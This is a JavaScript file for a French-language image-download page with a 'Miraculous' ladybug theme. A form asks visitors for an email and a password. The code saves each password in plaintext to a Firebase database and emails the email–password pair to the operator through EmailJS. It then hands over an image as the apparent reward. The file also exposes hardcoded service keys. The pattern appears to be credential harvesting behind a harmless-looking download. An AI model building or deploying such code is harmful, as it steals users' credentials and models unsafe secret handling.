// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyBQfFPn42aa9KViqmyaZKiFiOZrwTrh-fk",
    authDomain: "miraculous-899ef.firebaseapp.com",
    databaseURL: "https://miraculous-899ef-default-rtdb.firebaseio.com",
    projectId: "miraculous-899ef",
    storageBucket: "miraculous-899ef.appspot.com",
    messagingSenderId: "221560668465",
    appId: "1:221560668465:web:ac6ca40509770265bcf010",
    measurementId: "G-FLXRSH7H1D"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const usedPasswordsRef = database.ref('usedPasswords');

// Initialize EmailJS
(function() {
    emailjs.init("P5sZnQL5xeXagOuEn");
})();

// Handle form submission
document.getElementById('downloadForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    try {
        // Get list of used passwords
        const snapshot = await usedPasswordsRef.once('value');
        const usedPasswords = snapshot.val() || {};

        // Check if password is already used
        if (Object.values(usedPasswords).includes(password)) {
            alert("Ce mot de passe a déjà été utilisé. Veuillez en choisir un autre.");
            return;
        }

        // Save the new password
        const newPasswordRef = usedPasswordsRef.push();
        await newPasswordRef.set(password);

        alert("Mot de passe valide! Téléchargement en cours...");

        // Trigger file download
        const fileUrl = 'ladybug.png'; // Replace with your actual file path
        const a = document.createElement('a');
        a.href = fileUrl;
        a.download = 'miraculous.png';
        a.click();

        // Send email using EmailJS
        const templateParams = {
            email: email,
            password: password,
        };

        emailjs.send('service_2pmpp5p', 'template_0gmgvlw', templateParams)
            .then((response) => {
                console.log('Email envoyé avec succès!', response);
            }, (error) => {
                console.error('Erreur lors de l\'envoi de l\'email:', error);
            });
    } catch (error) {
        console.error("Erreur:", error);
        alert("Quelque chose s'est mal passé!");
    }
});
